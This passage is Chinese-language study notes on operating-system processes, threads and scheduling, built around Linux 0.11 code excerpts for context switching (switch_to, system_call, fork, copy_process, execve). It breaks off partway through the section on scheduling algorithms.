进程\n我们都知道计算机的核心是CPU，它承担了所有的计算任务，而操作系统是计算机的管理者，它负责任务的调度，资源的分配和管理，统领整个计算机硬件；应用程序是具有某种功能的程序，程序是运行于操作系统之上的。\n进程是一个具有一定独立功能的程序在一个数据集上的一次动态执行的过程，是操作系统进行资源分配和调度的一个独立单位，是应用程序运行的载体。进程是一种抽象的概念，从来没有统一的标准定义。进程一般由程序，数据集合和进程控制块三部分组成。程序用于描述进程要完成的功能，是控制进程执行的指令集；数据集合是程序在执行时所需要的数据和工作区；程序控制块包含进程的描述信息和控制信息是进程存在的唯一标志\n进程具有的特征：\n动态性：进程是程序的一次执行过程，是临时的，有生命期的，是动态产生，动态消亡的；\n并发性：任何进程都可以同其他进程一起并发执行；\n独立性：进程是系统进行资源分配和调度的一个独立单位；\n结构性：进程由程序，数据和进程控制块三部分组成\n线程\n在早期的操作系统中并没有线程的概念，进程是拥有资源和独立运行的最小单位，也是程序执行的最小单位。任务调度采用的是时间片轮转的抢占式调度方式，而进程是任务调度的最小单位，每个进程有各自独立的一块内存，使得各个进程之间内存地址相互隔离。\n后来，随着计算机的发展，对CPU的要求越来越高，进程之间的切换开销较大，已经无法满足越来越复杂的程序的要求了。于是就发明了线程，线程是程序执行中一个单一的顺序控制流程，是程序执行流的最小单元，是处理器调度和分派的基本单位。一个进程可以有一个或多个线程，各个线程之间共享程序的内存空间(也就是所在进程的内存空间)。一个标准的线程由线程ID，当前指令指针PC，寄存器和堆栈组成。而进程由内存空间(代码，数据，进程空间，打开的文件)和一个或多个线程组成。\n进程与线程的区别\n线程是程序执行的最小单位，而进程是操作系统分配资源的最小单位；\n一个进程由一个或多个线程组成，线程是一个进程中代码的不同执行路线\n进程之间相互独立，但同一进程下的各个线程之间共享程序的内存空间(包括代码段，数据集，堆等)及一些进程级的资源(如打开文件和信号等)，某进程内的线程在其他进程不可见；\n调度和切换：线程上下文切换比进程上下文切换要快得多\n任务调度\n大部分操作系统的任务调度是采用时间片轮转的抢占式调度方式，也就是说一个任务执行一小段时间后强制暂停去执行下一个任务，每个任务轮流执行。任务执行的一小段时间叫做时间片，任务正在执行时的状态叫运行状态，任务执行一段时间后强制暂停去执行下一个任务，被暂停的任务就处于就绪状态，等待下一个属于它的时间片的到来。这样每个任务都能得到执行，由于CPU的执行效率非常高，时间片非常短，在各个任务之间快速地切换，给人的感觉就是多个任务在“同时进行”，这也就是我们所说的并发\nCPU的工作原理\n给一个初始PC地址，按顺序取址执行\nPCB ：process control block\n为了描述控制进程的运行，系统中存放进程的管理和控制信息的数据结构称为进程控制块（PCB Process Control Block），它是进程实体的一部分，是操作系统中最重要的记录性数据结构。它是进程管理和控制的最重要的数据结构，每一个进程均有一个PCB，在创建进程时，建立PCB，伴随进程运行的全过程，直到进程撤消而撤消。\nTCB ：thread control block\n线程有自己的TCB，thread control block, 只负责这条流程的信息，包括PC程序计数器，SP堆栈，State状态，和寄存器。有不同的控制流，需要不同的寄存器来表示控制流的执行状态，每个线程有独立的这些信息，但共享一个资源。\nESP（Extended Stack Pointer）\nESP为扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针。与之对应的是EBP（Extended Base Pointer），扩展基址指针寄存器，也被称为帧指针寄存器，用于存放函数栈底指针。\nESP为栈指针，用于指向栈的栈顶（下一个压入栈的活动记录的顶部），而EBP为帧指针，指向当前活动记录的底部\n初识多进程 一、CPU工作原理 CPU工作原理很简单，就是不断的取指执行。CPU根据PC寄存器中的值到内存中取指令，PC会自动+1，当执行完本条指令后，CPU又根据PC寄存器取指执行。\n所以我们让CPU执行一段程序最直接的做法就是让PC的值设置为程序的起始地址，这样CPU会自动的执行这段程序直到程序结束。\n==CPU的工作原理：取指执行（自动的取指执行）==\n但是如果我们不对CPU进行管理，会导致CPU的利用率较低。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int main(int argc, char* argv[]) { int i , to, *fp, sum = 0; to = atoi(argv[1]); for(i=1; i\u0026lt;=to; i++) { sum = sum + i; fprintf(fp,“%d”, sum); } } //执行时间为 0.30521424865722897 int main(int argc, char* argv[]) { int i , to, *fp, sum = 0; to = atoi(argv[1]); for(i=1; i\u0026lt;=to; i++) { sum = sum + i; } } //执行时间为： 0.006346824075317383 从上面可以看到相同的循环次数，但IO任务的执行时间远远大于计算任务，但在执行IO任务时，CPU是空闲的，此时CPU利用率很低。我们可以让CPU在这段时间里忙碌起来，这就要我们对CPU进行管理。\n当将PC的值设置为程序的起始地址，如果不对CPU进行管理，让CPU自动的取指执行，如果程序有大量的IO任务时，CPU的利用率极低，所以我们要对CPU进行管理，提高CPU的利用率\nCPU管理 当在执行IO任务时，此时CPU处于空闲状态，我们可以将CPU分配给其他程序使用，当IO任务完成时，CPU又切换到该程序继续执行。\n管理：核心是任务的切换，内存存放多个程序，多个程序交替执行\nCPU的利用率将会提高： 任务切换：当一个程序执行IO任务时，把PC的值设置为另一个程序的执行地址就可以去执行另一个程序，然后IO任务完成，又切回原来的程序执行\n但是，如何在让CPU切换回来呢？\n运行中的程序会有一个称为PCB的数据结构，这个数据结构是用来记录当前程序运行的状态信息的，在进行任务切换时，将一些必要的信息压栈（如CS,IP)，然后要切换回来时，出栈（恢复成切换任务前的状态)，即可以让当前PC指针指向原来的程序位置，继续运行。\n二、多进程 1.引入进程 进程：==进程是进行（执行） 中的程序==(CPU的管理是为了提高CPU的利用率，提高的核心思想就是多道程序交替执行，为了实现多道程序交替执行，通过进程来管理程序的运行）\n进程和程序区别：\n1 2 3 1.进程是有状态的。有开始、结束等运行状态，而程序没有。 2.进程会记录一些寄存器的值，这些值就是上下文。 3.进程会走走停停，程序没有这个概念。 2.多进程 多进程图像：启动多个程序，交替执行，能充分利用CPU，启动了的的程序就是进程，多个进程的推进，操作系统只要把这些进程记录好，按照合理的次序推进(分配资源，进行调度)\n多进程图像一直存在于操作系统启动到关机的整个过程中\n操作系统在启动时开的第一个进程是shell或者windows桌面，shell再启动其他进程\n启动shell程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //一个命令启动一个进程， 返回shell再启动其他进程 int main(int argc, char * argv[]) { while(1) { scanf(“%s”, cmd); if(!fork()) { exec(cmd); } wait(); } } shell程序中在等待输入命令（CMD），有命令输入后就启动该命令对应的进程，然后返回shell再等待启动其他进程。如下图所示： 3.多进程的组织 ==多进程的组织：PCB + 状态 + 队列==\n每个进程都有个PCB（progress control block）来记录该进程的信息，操作系统依赖PCB来感知该进程，通过对PCB的感知将进程排入不同的队列，放在不同的状态中。如图\n三种不同的队列分别对应==运行态、就绪态、阻塞态。==操作系统控制进程在不同状态间切换将他们同时推进。形成如下状态图 时间片\n时间片即CPU分配给各个程序的时间，每个线程被分配一个时间段，称作它的时间片，即该进程允许运行的时间，使各个程序从表面上看是同时进行的。如果在时间片结束时进程还在运行，则CPU将被剥夺并分配给另一个进程。如果进程在时间片结束前阻塞或结束，则CPU当即进行切换。而不会造成CPU资源浪费。在宏观上：我们可以同时打开多个应用程序，每个程序并行不悖，同时运行。但在微观上：由于只有一个CPU，一次只能处理程序要求的一部分，如何处理公平，一种方法就是引入时间片，每个程序轮流执行\n进程资源和进程状态\nTASK_RUNNING：正在运行或处于就绪状态：就绪状态是指进程申请到了CPU以外的其它全部资源。正所谓：万事俱备，仅仅欠东风.提醒：一般的操作系统教科书将正在CPU上运行的进程定义为RUNNING状态、而将可运行可是尚未被调度运行的进程定义为READY状态。这两种状态在Linux下统一为 TASK_RUNNING状态。\nTASK_INTERRUPTIBLE：处于等待队伍中，等待资源有效时唤醒（比方等待键盘输入、socket连接、信号等等），但能够被中断唤醒.普通情况下，进程列表中的绝大多数进程都处于TASK_INTERRUPTIBLE状态.毕竟皇帝仅仅有一个（单个CPU时），后宫佳丽几千；假设不是绝大多数进程都在睡眠，CPU又怎么响应得过来。\nTASK_UNINTERRUPTIBLE：处于等待队伍中，等待资源有效时唤醒（比方等待键盘输入、socket连接、信号等等），但不能够被中断唤醒。\nTASK_ZOMBIE:僵死状态。进程资源用户空间被释放，但内核中的进程PCB并没有释放。等待父进程回收。\nTASK_STOPPED:进程被外部程序暂停（如收到SIGSTOP信号，进程会进入到TASK_STOPPED状态），当再次同意时继续运行（进程收到SIGCONT信号，进入TASK_RUNNING状态）。因此处于这一状态的进程能够被唤醒。\n多进程的交替\n==多进程交替： 队列操作+调度+切换==\n启动磁盘的读写为例:\n1 2 3 4 5 6 7 8 9 10 启动磁盘读写; pCur.state = ‘W’; 将pCur放到DiskWaitQueue(磁盘等待队列); schedule(); schedule() { pNew = getNext(ReadyQueue); switch_to(pCur,pNew); } pCur是PCB的里面的信息，w表示阻塞态。先将当前进程的状态置为阻塞态，将该进程放进磁盘等待队列。然后启动调度函数（schedule)来切换到下一个进程，其中getnext就是从就绪队列中取下一个将要执行的进程，switch完成切换\n进程切换\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //上下文切换 switch_to(pCur,pNew) { //保存正在进行的程序 pCur.ax = CPU.ax; pCur.bx = CPU.bx; ... pCur.cs = CPU.cs; pCur.retpc = CPU.pc; //将要运行的程序压入CPU中 CPU.ax = pNew.ax; CPU.bx = pNew.bx; ... CPU.cs = pNew.cs; CPU.retpc = pNew.pc; } 保存当前现场，恢复下个程序的现场然后执行下个程序。\n4.多进程的影响 1.内存管理 由于内存中同时存在多个进程的，多个进程在交替，那么如图中进程1在访问地址100，而地址一百正是进程2开始的地方，进程2很可能还没有完成，就切到了进程1，如果在进程1中地址100处的内容被修改了，那么切回进程2时程序就出错了。 解决的办法：限制对地址100的读写\n多进程的地址空间分离：内存管理的主要内容\n==通过进程的地址映射实现进程间的地址空间分离==\n进程1的映射表将访问限制在进程1范围内，进程1根本访问不到其他进程的内容。也就是[100]只是逻辑上的地址，其对应一篇内存上的物理地址，即使不同进程间都有逻辑地址100，但其对应的物理空间不同\n2.多进程合作\n打印任务1看到就绪队列空了后，就把自己放了进去，这时打印任务2也看了就绪队列空了，也想把自己放进去，此时任务1还没放完，进插入了任务2，那么7上同时由两个任务的内容，打出来不就是乱码 所以，在处理共享资源时，可以给共享的资源进行上锁。等待该资源被开锁，下一个进程才能使用\n用户级线程与内核级线程 一、线程的定义 ==线程是操作系统能够调度和执行的基本单位，在 Linux 中也被称之为轻量级进程(LWP：light weight process)==,在 Linux 系统中，一个进程至少需要一个线程作为它的指令执行体，进程管理着资源比如 cpu、内存、文件，将线程分配到某个 cpu 上执行\n一个进程可以拥有多个线程，它还可以同时使用多个cpu 来执行各个线程，以达到最大程度的并行，提高工作的效率。\n==线程的本质是一个进程内部的一个控制序列，它是进程里面的东西，一个进程可以拥有一个进程或者多个进程==\n每一个进程都包含一个映射表，如果进程切换了，那么程序选择的映射表肯定也不一样；进程的切换其实是包含两个部分的，**第一个指令的切换，第二个映射表的切换。**指令的切换就是从这段程序跳到另外一段程序执行，映射表切换就是执行不同的进程，所选择的映射表不一样。线程的切换只有指令的切换，同处于一个进程里面，不存在映射表的切换。进程的切换就是在线程切换的基础上加上映射表的切换。\n==进程 = 资源 + 指令执行序列==\n所以，对应线程来说只是切换pc，内存和表不用切。\n在每个大的进程里，有很多小的线程，并行的时候只需要改每个小的线程的PC指针，而不需要切换映射表。\n所以，学习好线程是学习好进程的关键。\n二、用户级线程 pthread_create函数用来创建一个线程，yield函数保证线程之间可以进行切换。\n打开一个浏览器：\n1 2 3 4 一个线程用来从服务器接收数据 一个线程用来处理图片(如解压缩) 一个线程用来显示文本 一个线程用来显示图片 这些线程要共享资源： 接收数据放在100处， 显示时要读… 所有的文本、 图片都显示在一个屏幕上\nYield进行线程间的调度：\n下面程序就是用户级线程的应用，==通过用户主动进行切换，不用内核帮助。用户级线程是可以独立于操作系统的==\nyield实现线程的切换\n两个执行序列对应两个栈\n一个方法执行完 esp(extended stack pointer)弹栈\njmp 204 后，执行完B()方法，esp指向的内存值还是204，又返回到了204，所以jmp 204要去掉\n线程一先执行A,执行到B,跳转到B并将A的下一条指令的压栈，Yield切换到线程二的C，同时将下一条指令压栈。到了线程二在C里面又跳转到D并压栈，D里面又切换线程，压栈，同时将B压入的栈弹出，执行B。B执行完又弹栈，跳到A里面执行…（大概就是这样吧)\n注：线程一和线程二压入的栈不是同一个\n两个线程的样子： 两个TCB、 两个栈、 切换的PC在栈中\n创建一个线程就要为该线程创建相应的栈，并将sp指向栈顶\nYield是用户程序\n用户级线程只能在用户态进行切换，进入内核后还是同一个进程，Yiled程序是用户程序，而核心级线程会进入内核进行切换，ThreadCreat是系统调用，内核也知道TCB，Yield程序也不是用户编写，而是内核程序，用户不可见，至于调度点，也是有操作系统决定 三、核心级线程 并发——有处理多个任务的能力，但不一定得同时执行\n并行——有能力处理多个任务，并且是同时执行的\nMMU：Memory Management Unit 内存管理单元\n多进程：因为切换时有地址映射的切换，需要消耗显著的资源\n用户级线程，因为不进入到内核，所以操作系统无法为其分配cpu，即多个线程在一个cpu上切换\n通过查阅资料，老师说的多进程不能发挥多核价值，或许有误\n1.linux下并未对进程线程分别做抽象，都是利用task_struct来描述具体调度的一个单元\n2.也就是说创建进程、线程的时候其实都是调用的clone\n3.如果clone传参共享资源则为创建线程反之则为进程\n4.所以“多进程在多核上的情况”，其关键就在于MMU是否共享\n5.直接给出回答：MMU通常不是共享的。\n6.具体参考i7存储系统框图，每个core都有一个MMU\n7.也就是说如果有两个进程A B，每个进程下有两个线程A:T1T2 B:T3T4\n8.两core单CPU情况下，可以是core1:T1 core2:T3\n核心级线程与用户级线程区别：\n1.==核心级线程需要在用户态和核心态里面跑，在用户态里跑需要一个用户栈，在核心态里面跑需要一个核心栈==。用户栈和核心栈合起来称为一套栈，这就是核心级线程与用户级线程一个很重要的区别，从一个栈变成了一套栈。\n2.用户级线程用TCB切换栈的时候是在一个栈与另外一个栈之间切换，核心级线程就是在一套栈与另外一套栈之间的切换（核心级线程切换），核心级线程的TCB应该是在内核态里面。\n内核级线程一套栈如图: 用户栈+内核栈 用户栈和内核栈之间的关联：\n当线程进入内核的时候就应该建立一个属于这个线程的内核栈，通过INT中断进入内核。当线程下一次进入内核的时候，操作系统可以根据一些硬件寄存器来知道这个哪个线程，它对应的内核栈在哪里。**同时会将用户态的栈的位置（SS、SP）和程序执行到哪个地方了（CS、IP）都压入内核栈。**等线程在内核里面执行完（也就是IRET指令）之后就根据进入时存入的SS、SP的值找到用户态中对应栈的位置，根据存入的CS、IP的值找到程序执行到哪个地方。\n内核级线程执行过程： 首先该线程调用B函数，将104压栈（用户栈），进入B函数之后调用read()这个系统调用，同时将204压栈（用户栈），进入read()系统调用通过int0x80这个中断号进入内核态，执行到sys_read()\nsys_read()函数:\n1 2 3 4 5 6 sys_read() {\t启动磁盘读; 将自己变成阻塞; 找到next; switch_to(cur, next);} switch_to的作用就是切换线程 switch_to仍然是通过TCB找到内核栈指针；然后通过ret切到某个内核程序；最后再用CS:PC切到用户程序\n形参cur表示当前线程的TCB，next表示下一个执行线程的TCB。 这个函数首先将目前esp寄存器的值存入cur.TCB.esp，将next.TCB.esp放入esp寄存器里面；其实就是从当前线程的内核栈切换到next线程的内核栈。\n==内核级线程自己的代码还是在用户态的，只是进入内核态完成系统调用==，也就是逛一圈之后还是要回去执行的。因此切换到next线程就是要根据next线程的内核栈找到这个线程阻塞前执行到的位置，并接着执行。所以切换到next线程的内核栈之后应该通过一条包含IRET指令的语句进入到用户态执行这个线程的代码。这样就从cur线程切换到next线程。\n内核级线程的切换是在内核里面进行切换的，切换完成后，再根据next内核栈里面的数据，返回到next用户栈\n所以，要想从next的内核栈，经过弹栈，返回到next的用户栈，在我们调用ThreadCreate()创建线程的时候，我们就要将线程的内核栈和用户栈创建好并且将相应的数据压栈。\n1、申请内存，作为TCB 2、申请内存，作为内核栈 3、内核栈和用户栈相关联 4、TCB关联内核栈\n如图 内核线程switch_to的五段论（这里先了解一下） 流程大概是这样的，用户态线程切换，需要中断进入内核态，然后在内核态进行TCB切换\nTCB切换之后，可以切换到另一个内核态线程，然后通过中断返回切换成用户态线程，从而实现用户态线程的切换\n其实就是T线程用户栈到内核栈(这个切换要记录返回的东西)，再通过内核中的TCB队列，切换到S线程的内核栈， 由于S的内核保留了S的用户栈，所以可以切到S的用户栈继续执行\n下一篇笔记将详细介绍这个五段论\n对比： 总结 根据在用户空间还是在核心实现多线程机制，线程又被分为用户级线程（User Level Thread）和内核级线程（Kernel Level Thread）\n内核级线程实现 前言 提示： 这里主要对内核线程switch_to的五段论程序进行分析。\n五段论： 核心级线程的两套栈， 核心是内核栈\n==核心级线程的切换过程：==\n一、中断入口及出口 从INT 中断进入内核： 1 2 3 4 5 6 7 8 9 10 在 main()中： 1.首先在A()函数中系统调用fork()，将B()的地址压入用户栈。 2.fork() 引起中断0x80，进入内核。 3.执行int 0x80时，还未进入内核，首先找到内核栈，压入当前栈地址（即用户栈）; 压入当前CS:IP（用户态）(ret = CS:IP) 4.进入内核，执行system_call。 1.中断入口 int对应的中断处理函数是 system_call，int执行时，是用户态，执行完，进入内核态，如图，0x80 对应sysstem_call\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 1.刚进入内核，首先在内核态中的各种寄存器压到栈中，即保护现场。 2.执行sys_fork(),继续向下执行，但在执行sys_fork的时候可能引起切换 3.接下来看当前PCB中的state是否等于0，如果不是那么就要进行调度，就是靠 schedule，完成五端论中的中间三步 state(%eax)相当于state + _current,与 0（就绪或运行态）作比较，非0即阻塞， _current即PCB，阻塞则调度(reschedule) 4.再看看它的时间片是否等于0，时间片用光了也要进行调度 再次判断counter + _current 判断是否时间片用尽，若是则切换(reschedule 5.执行中断返回的函数ret_from_sys_call，iret也就是从内核栈到用户栈的切换 system_call.s\n1 2 3 4 5 6 _system_call: push %ds..%fs pushl %edx... call _sys_call_table(,%eax,4) pushl %eax //把系统调用号入栈。 //刚进入内核，_system_call将用户态信息压栈，通过 _sys_fork_table 调用 sys_fork reschedule执行的是_schedule().\n1 2 3 4 reschedule: ;将ret_from_sys_call 的地址入栈,，reschedule遇到 } 出栈，弹出ret_from_sys_call pushl $ret_from_sys_call jmp _schedule ;调用schedule 2.中断出口 中断入口: 建立 内核栈和用户栈 的关联 ，sys_fork与中间三段有关，然后先看中断出口\n中断出口这里完成第二次切换，从内核栈切换到用户栈 还原现场，并恢复到用户态\n1 2 3 4 5 6 7 8 9 10 11 # 中断返回，执行中断返回函数，从内核栈，切换到用户栈 ret_from_sys_call: ... popl %eax # 弹出信号值,出栈，与中断入口的push对应 popl %ebx popl %ecx popl %edx pop %fs pop %es pop %ds iret # 将内核栈的内容出栈，切换到 下一个进程的TCB 二、切换 1.schedule ==schedule()是调度函数==\nnext是下一个进程的PCB，核心是switch_to\n1 2 3 4 5 6 7 void schedule (void) { next = i; //找到下一个线程的TCB next，切换到下一个线程 ... switch_to (next); // 切换到任务号为next 的任务，并运行之 } 2.Switch_to(内核栈切换) linux 0.11 中基于==TSS(Task Struct Segement) 切换==，但也可以用栈切换，因为tss中的信息可以写到内核栈中\nTSS是一个段，即一块内存，这里保存要切换的进程的cpu信息，包括各种寄存器的值、局部描述表ldt的段选择子等，切换时cpu会将这段内容存进各自对应的寄存器，然后就完成了切换。（任务切换或者说CPU状态更新实质上就是改变各个寄存器的值）\n1 2 3 4 5 6 7 8 //32位TSS段结构 struct TSS32 { int backlink, esp0, ss0, esp1, ss1, esp2, ss2, cr3; int eip, eflags, eax, ecx, edx, ebx, esp, ebp, esi, edi; int es, cs, ss, ds, fs, gs; int ldtr, iomap; }； 每一个进程都有自已的TSS和LDT，而TSS（任务描述符）和LDT（私有描述符）必须放在GDT中\n使用的话首先要在GDT表中设置一个TSS段，就是保存TSS段的位置，然后将TSS段对应的是段选择子存入TR寄存器，告诉cpu这个TSS段在哪里。按照intel最初的设计，每个任务或者进程都应该设置一个TSS段，任务切换时直接将对应的TSS段的内存加载到CPU就行了。\n但是后来发现这种设计会带来过多的系统开销，每次切换都要将所有的寄存器更新，需要数百个指令周期，因此主流的操作系统均不使用这种方法。linux采取的方法是绕开TSS段进行任务切换，每个CPU仅设置一个TSS段，仅使用esp0和iomap，采用软件方法切换寄存器，节省了开销。\nswitch_to 通过 TSS(任务结构段） 实现切换，ljmp 是长跳转指令，如图 黄色的是原TSS，绿的是新TSS，下边 GDT（全局描述符表Global Descriptor Table保存的是TSS的描述符\n粉色的是 CPU当前的寄存器段信息，TR是一个选择子，可以根据TR找到当前进程的tss\n==切换就是 将 CPU的寄存器信息 写入当前线程的TSS中，TR指向新的TSS(n) 的段描述符，再找到新的TSS，将新的TSS段内容 载入 CPU的寄存器ESP中==\nswith_to内嵌宏定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #define switch_to(n) { struct {long a,b;} __tmp; __asm__( \u0026#34;cmpl %%ecx,_currentnt\u0026#34; // 任务n 是当前任务吗?(current ==task[n]?) \u0026#34;je 1fnt\u0026#34; // 是，则什么都不做，退出。 \u0026#34;movw %%dx,%1nt\u0026#34; // 将新任务的选择符*\u0026amp;__tmp.b。 \u0026#34;xchgl %%ecx,_currentnt\u0026#34; // current = task[n]；ecx = 被切换出的任务。 \u0026#34;ljmp %0nt\u0026#34; // 执行长跳转至*\u0026amp;__tmp，造成任务切换。 // %0 是 \u0026#34;m\u0026#34;(*\u0026amp;__tmp.a),%1 是 \u0026#34;m\u0026#34;(*\u0026amp;__tmp.b) // 在任务切换回来后才会继续执行下面的语句。 \u0026#34;cmpl %%ecx,_last_task_used_mathnt\u0026#34; // 新任务上次使用过协处理器吗？ \u0026#34;jne 1fnt\u0026#34; // 没有则跳转，退出。 \u0026#34;cltsn\u0026#34; // 新任务上次使用过协处理器，则清cr0 的TS 标志。 \u0026#34;1:\u0026#34;::\u0026#34;m\u0026#34; (*\u0026amp;__tmp.a), \u0026#34;m\u0026#34; (*\u0026amp;__tmp.b), \u0026#34;d\u0026#34; (_TSS (n)), \u0026#34;c\u0026#34; ((long) task[n])); } 3.sys_fork 创建一个进程（或内核级线程），就是要做成能切换的样子\nsystem_call.s 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 根据父进程，创建子进程，copy_press前,将参数压栈,这些参数是父进程在用户态的样子 _sys_fork: call _find_empty_process # 调用find_empty_process()(kernel/fork.c)。 testl %eax,%eax js 1f push %gs pushl %esi pushl %edi pushl %ebp pushl %eax call _copy_process # 调用C 函数copy_process()(kernel/fork.c)。 addl $20,%esp # 丢弃这里所有压栈内容。 ret _copy_process 调用 copy_process() 函数\ncopy_process 将父进程的栈都作为参数，C语言中参数越靠后越靠近栈顶\n作用如图： 注：申请内存空间，注意这是在内核中，用get_free_page()，而不是malloc\r同时还要设置TTS，是使能够切换 父进程与子进程 内核栈不同，用户栈相同\ncopy_process ()函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /* * Ok, this is the main fork-routine. It copies the system process * information (task[nr]) and sets up the necessary registers. It * also copies the data segment in it\u0026#39;s entirety. */ /* * OK，下面是主要的fork 子程序。它复制系统进程信息(task[n])并且设置必要的寄存器。 * 它还整个地复制数据段。 */ // 复制进程。 int copy_process (int nr, long ebp, long edi, long esi, long gs, long none, long ebx, long ecx, long edx, long fs, long es, long ds, long eip, long cs, long eflags, long esp, long ss) { struct task_struct *p; int i; struct file *f; p = (struct task_struct *) get_free_page (); // 获取一页空闲内存作为PCB，一页是4k …… p-\u0026gt;state = TASK_UNINTERRUPTIBLE; // 将新进程的状态先置为不可中断等待状态。 p-\u0026gt;pid = last_pid; // 新进程号。由前面调用find_empty_process()得到。 p-\u0026gt;father = current-\u0026gt;pid; // 设置父进程号。 p-\u0026gt;counter = p-\u0026gt;priority; …… // 设置TSS p-\u0026gt;tss.esp0 = PAGE_SIZE + (long) p; // esp0 正好指向该页顶端，PAGE_SIZE=4k，p是刚申请的内存空间 p-\u0026gt;tss.ss0 = 0x10; // 堆栈段选择符（内核数据段）[??]。 p-\u0026gt;tss.eip = eip; // 指令代码指针。 p-\u0026gt;tss.eflags = eflags; // 标志寄存器。 p-\u0026gt;tss.eax = 0; p-\u0026gt;tss.ecx = ecx; p-\u0026gt;tss.cs = cs \u0026amp; 0xffff; …… p-\u0026gt;tss.ldt = _LDT (nr); // 该新任务nr 的局部描述符表选择符（LDT 的描述符在GDT 中）。 …… // 在GDT 中设置新任务的TSS 和LDT 描述符项，数据从task 结构中取。 // 在任务切换时，任务寄存器tr 由CPU 自动加载。 set_tss_desc (gdt + (nr \u0026lt;\u0026lt; 1) + FIRST_TSS_ENTRY, \u0026amp;(p-\u0026gt;tss)); set_ldt_desc (gdt + (nr \u0026lt;\u0026lt; 1) + FIRST_LDT_ENTRY, \u0026amp;(p-\u0026gt;ldt)); p-\u0026gt;state = TASK_RUNNING; /* do this last, just in case */ /* 最后再将新任务设置成可运行状态，以防万一 */ return last_pid; // 返回新进程号（与任务号是不同的）。 } ==小结：==\n1.fork有中断，中断会调用 system_call\n2.system_call的作用：\n(1) 调用sys_fork，调用 copy_process，父进程与子进程内核栈不同，用户栈相同\n(2) 判断cmpl $0,state(%eax)，非0表示阻塞，调用 reschedule 进程调度 reschedule 调用 schedule，schedule调用 switch_to（switch_to中ljmp实现长跳转，子进程将 TSS的内容复制到 CPU上，TSS图中粉色的部分）\n(3) iret 内核栈出栈 a.子进程回到用户栈，执行的是 中断下边的一句代码：mov res, %eax ，res = %eax = 0\nb.父进程回到用户栈，执行的也是 中断下边的一句代码：mov res, %eax， 父进程 eax != 0\n程序在用户态执行，切换时找到自己的内核栈， 找到TCB，通过switch_to 完成TCB的切换，完成内核栈的切换，再完成用户栈的切换\n4.fork()典例 基本使用格式：\n1 2 3 4 5 6 7 8 if(!fork()) { //子进程执行 } else { //父进程执行 } shell终端的命令的执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 int main(int argc, char * argv[]) { while(1) { scanf(\u0026#34;%s\u0026#34;, cmd); if(!fork()) { exec(smd); // 执行子进程命令 } wait(0); // 执行父进程命令，shell等待用户输入 } } ==exec 是一个系统调用，会执行 system_call==\n子进程将进入if块内，调用exec，子进程将被更换新的代码，如下图\nThreadCreate(*A)创建一个进程：\n更换新的代码，我们知道iret指令将把栈弹出，这时CS:EIP将被更改到用户态代码段，那么我们只需要更改栈中储存的CS:IP即可，先偏移量EIP=0x1C，并将EIP+%esp压入栈中，即EIP在栈中位置，执行do_execve。\r子进程A执行： do_execve，将程序入口地址给eip，更改代码段；eip[3]正好等于SP，更改栈。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 _system_call: push %ds ... %fs pushl %edx... call sys_execve # sys_execve执行前，执行的是 父进程的代码 _sys_execve: lea EIP(%esp),%eax # EIP = 0x1C是十进制的28，将%esp偏移28，eip的地址复制给eax pushl %eax call _do_execve # 子进程通过 _sys_execve 退出内核（通过IRET实现中断返回），回到用户态，执行新的子进程的代码 int do_execve(* eip, ...) { p += change_ldt(...; eip[0] = ex.a_entry;// ex.a_entry是可执行程序入口地址，产生可执行文件时 写入 eip[3] = p; // eip[0]=esp + 0x1C; 28的位置存的子进程的入口 // eip[3]=esp+0x1C+0x0C ... } 总结 1.理解switch_to对应的栈切换， 将自己变成计算机 2.ThreadCreate的目的就是初始化这样一套栈 如图 切换过程：\n程序在用户态执行，切换时找到自己的内核栈， 找到TCB，通过switch_to 完成TCB的切换，完成内核栈的切换，再完成用户栈的切换\nCPU调度策略 前言 问题引入：\n当线程1阻塞，线程2 3都处于就绪态，该执行哪个呢？需要有调度策略\nCPU调度的直观想法：\n1.FIFO:先进先出 (排队) 2.Priority:优先级高的先执行\n面对复杂的场景，这两种几乎行不通的。\nCPU调度：即按一定的调度算法从就绪队列中选择一个进程，把CPU的使用权交给被选中的进程，如果没有就绪进程，系统会安排一个系统空闲进程或idle进程\nCPU调度时机：发生在内核对中断/异常/系统调用处理后返回到用户态时\n1 2 3 4 进程正常终止 或 由于某种错误而终止； 新进程创建 或 一个等待进程变成就绪； 当一个进程从运行态进入阻塞态； 当一个进程从运行态变为就绪态。 CPU调度算法衡量指标：\n1 2 3 4 5 6 7 8 9 10 11 吞吐量 （Throughput）： 每单位时间完成的进程数目； 周转时间TT (Turnaround Time)：每个进程从提出请求到运行完成的时间； 响应时间RT(Response Time)：从提出请求到第一次回应的时间； CPU利用率(CPU Utilization)：CPU做有效工作的时间比例； 等待时间(Waiting time)：每个进程在就绪队列(ready queue)中等待的时间； …… 一、调度算法 设计调度算法的目的：\n1 2 3 4 5 6 7 8 9 1.面对用户，目的是让用户满意 2.面对进程：CPU调度的目标是进程满意 进程满意: 尽快结束任务：周转时间（从任务进入到任务结束）短 响应用户操作快：响应时间（从操作发生到响应）短 系统内耗时间少：吞吐量（完成的任务量） 总原则：系统专注于任务执行，又能合理调配任务 1.FCFS（First Come, First Served） 先来先服务算法（FCFS——First Come First Serve）：\n==按照进程就绪的先后顺序使用CPU。==\n特点：非抢占，公平，实现简单，长进程后面的短进程需要等很长时间，不利于用户体验\n三个进程的处理时间分别为12，3，3，分两种进程到达顺序讨论 优点：调度算法简单\n缺点： 1.平均等待时间波动较大，短的进程可能排在长的进程后面得到执行\n2.I/O资源和CPU资源利用率较低，CPU密集型进程会导致I/O设备闲置，I/O密集型进程会导致CPU闲置\n2.SJF（Shortest Job First） 最短作业优先（SJF——Shortest Job First）：\n具有==最短完成时间==的进程优先执行，非抢占\n如果调度结果是 P1，P2，…，Pn，则平均周转时间为： P1 + P2 + P3 + … + Pn = ∑(n + 1 - i) * Pi P1的周转时间是 P1 P2的周转时间是 P1 + P2 …… Pn的周转时间中含有 n*P1 + (n - 1) * P2 + … P1 